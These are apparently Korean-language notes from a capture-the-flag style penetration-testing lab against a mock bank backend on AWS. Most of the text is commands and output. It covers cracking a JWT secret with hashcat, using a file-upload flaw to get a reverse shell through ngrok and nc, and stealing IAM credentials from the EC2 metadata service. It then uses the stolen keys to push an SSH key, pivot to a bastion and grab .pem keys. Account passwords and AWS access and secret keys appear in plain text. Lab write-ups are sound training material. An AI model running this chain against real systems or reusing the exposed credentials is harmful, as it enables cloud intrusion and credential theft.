
계정 1.
smlee@finss.co.kr / 205152 / 
smlee2 / 156276 / 
smlee3 /  674894 / 10000

admin / admin 

**jwt**
`secret`

**칼리 명령어**

```
hashcat -a 0 -m 16500 [JWT값] [경로]\jwt.secrets.list

ex)
hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNtbGVlMyIsImlzX2FkbWluIjpmYWxzZSwiaWF0IjoxNjk3NDIyMjg5fQ.-zg_b1uYp6G105K_lRVEbeVHOmKDE_r7kfJxGzmkStw ./Desktop/Hacking_data/01.autoAttack/jwt.secrets.list
```


# 서버해킹

*  파일다운로드 취약점 활용 

*  js 쉘?  

/api/qna/fileup
/home/ubuntu/OhBANK/BackendServer/lib/api/Qna/fileup.js

/home/ubuntu/OhBANK/BackendServer/lib/api/Qna/filedownload.js

**업로드경로**
/home/ubuntu/OhBANK/BackendServer/upload/

# api , js  지식 
router.use 사용법 
router.get 사용법 

mydata.js 

* nslookup
http://aaaa-elb-1724495853.ap-northeast-2.elb.amazonaws.com:3000/
43.200.251.188
15.164.65.239
ip 두개중 버프에서는 43.200.251.188로 알려줌


**kali ngrok 다운**

mydata.js 
req.query.port,req.query.ip


**리버스 쉘 접속 순서**

* ./ngrok tcp 8888
*  nslookup 해당 열린 url ip 및 포트 확인 
* nc -lvp 8888 
* http://aaaa-elb-1724495853.ap-northeast-2.elb.amazonaws.com:3000/api/qna/filedown/attack?ip=18.177.60.68&port=16728


**aws 서버 접속 정보**
aws_access_key_id = ASIAX7VPRS2F2IFHQJ4M
aws_secret_access_key = biZ2dzkLHhTBCUlL6Ts65hXwS0GExKpuOdUeivmC

ASIAX7VPRS2FR4GCHGV3
gVsl44VfB5oUp64Elq0GiATbhPU/8m6Fmq4vOvBH

> 파일찾기

`find / -name '*.pem'`


ap-northeast-2

   
dns : aaaa-elb-1724495853.ap-northeast-2.elb.amazonaws.com
ip - 
43.200.251.188
15.164.65.239

현재 접속아이피 
10.0.50.163 


ssh -i "키이름.pem" [유저네임]@ec2-[접속IP].ap-northeast-2.compute.amazonaws.com


ssh -i ubuntu@ec2.43.200.251.188.ap-northeast-2.compute.amazonaws.com


보기편하게
python3 -c 'import pty; pty.spawn("/bin/bash")'


1.
다른네트워크와 연결 하는지 확인하는방법 


netstat -antp 

ssh root@10.0.1.158   publickey 필요 
ssh root@10.0.2.22
ssh root@10.0.1.225
ssh root@52.95.194.54

mysql -ufinsshack -p -h10.0.1.158

grep -rinoE 'root'
grep / rinoE 'root'
grep -rinoE 'pass' /

grep -rinoE 'finsshack' / 

.ssh > authorized_keys 에 finsshack 정보 있음 


# 4. AWS 메타데이터를 이용해 키 탈취 


**접속 유저 정보 확인 가능**
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ubuntu@ip-10-0-150-45:~/OhBANK/BackendServer$ 
```


**공격자 - 공격대상 연결**
```
curl http://169.254.169.254/latest/meta-data
```

http://169.254.169.254/latest/meta-data
실행중인 모든 인스턴스 메타데이터를 확인 가능 하다
AWS EC2라면 모두 조회 가능하다. 

왜 169.254.169.254 url을 사용하는가? 
특정 IP 주소 블록은 IANA 특수 목적 주소 레지스트리에 나열된 지정된 목적을 갖습니다. 
모든 네트워킹 인프라는 이러한 표준을 준수해야 합니다. 
169.254.169.254는 클라우드 시스템에서 액세스할 수 있는 IP 주소 중 하나입니다.

* 169.254.0.0/16(CIDR표기법)   로컬링크   

링크-로컬 IP 주소는 동일한 물리적 또는 논리적 네트워크 링크 내에서 액세스할 수 있는 호스트를 나타냅니다

링크-로컬 IP 주소는 다음과 같은 여러 가지 이유로 **자동 구성 서비스에 적합합니다 .**

- 이는 소스와 대상 모두로 작동하는 전달 불가능한 특수 IP 주소의 유일한 블록입니다.
- 클라우드 서버가 데이터 센터 내에서 보호되므로 동일한 로컬 네트워크 세그먼트에 악성 장치가 연결될 위험이 없습니다.
- 클라우드 사용자는 이 공간을 서브넷화할 수 없습니다.

이러한 이유로 **NTP(Network Time Protocol), IMDS(Instance Metadata Service) 등 클라우드상의 가상 컴퓨터에 필요한 서비스는 링크-로컬 IP 주소를 사용합니다** .

**클라우드 인스턴스 메타데이터 서비스IMDS(Instance Metadata Service)**
네트워크 구성, 가용성 영역, 장치 유형 및 기타 정보와 같은 메타데이터일 수 있습니다.

**IMDS는 대부분의 클라우드 플랫폼에서 169.254.169.254를 통해 액세스할 수 있습니다.**

**[AWS IMDS는](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) IMDSv1과 IMDSv2의 두 가지 버전으로 제공됩니다** . 후자가 전자보다 더 안전합니다. 기본적으로 둘 다 EC2에 대해 활성화되어 있습니다. 169.254.169.254를 통해 액세스할 수 있습니다.

**reference**
> https://www.iana.org/assignments/iana-ipv4-special-registry/iana-ipv4-special-registry.xhtml
> https://www.baeldung.com/linux/cloud-ip-meaning


**공격자 - 공격대상 연결**
```
// 토큰 값 조회 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials

// 토큰 값 탈취 후 조회 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/aaaa-WEB-Role
```

**공격자 피시에서 진행**
먼저 awscli 설치  (https://ko.linux-console.net/?p=22015)

```
// 버전 확인
/usr/local/bin/aws --version
aws-cli/1.29.78 Python/3.11.4 Linux/6.1.0-kali9-amd64 botocore/1.31.78

// aws 설정 작업 앞서 찾아둔 값 입력 
aws configure 

AWS Access Key ID [None]: ASIAX7VPRS2F75INO6YM
AWS Secret Access Key [None]: 6n2K0SxDxiMWIQ333T5czJ7aqbwYQKrWrLAH1aTi
Default region name [None]: ap-northeast-2
Default output format [None]: json

// .aws 로 이동 
cd ~/.aws 

// token 값 추가 
vim credentials
제일 하단에 
aws_session_token = 탈취한 토큰값 추가 
```

**instances 항목 확인**
```
aws ec2 describe-instances 
```

**ssh-key 생성**
```
ssh-keygen -t rsa -f gotobas   
```

**공개키 업로드**
여기서 사용할 instance id 는 앞서 확인한 instances 항목에서 확인한다
instances 항목에서 bastion 서버를 찾아서 해당 instanceid를 입력한다. 
user ubuntu 는 추측으로 찾는다. 
```
aws ec2-instance-connect send-ssh-public-key \
--instance-id i-09efaccd654290737 \
--availability-zone ap-northeast-2c \
--instance-os-user ubuntu \
--ssh-public-key file://gotobas.pub

{
    "RequestId": "1188e55d-6c4b-4cb8-885d-39bb458a01ca",
    "Success": true
}
```

결과 나온 후 바로
뒤 ip는 동일하게 instaces항목에서 bastion서버에의 public ip를 확인한다. 
```
//ssh 접속 
ssh -i gotobas ubuntu@54.180.107.5  

...
ubuntu@ip-10-0-1-158:~$  // 바스티온 서버 접속 확인 

```

**pem key 찾기**
```
find . -name "*.pem"

./key/private/in/finsshack.pem

```


SFTP 접속 
```
sftp -P 22 -i "finsshack.pem" ubuntu@10.0.30.39
```

ssh 접속
```
ssh -i "finsshack.pem" ubuntu@10.0.30.39
```

cat 
```
ubuntu@ip-10-0-30-39:~$ cat security
핀시큐리티
모의해킹팀
10점 완료~
축하합니다.
```

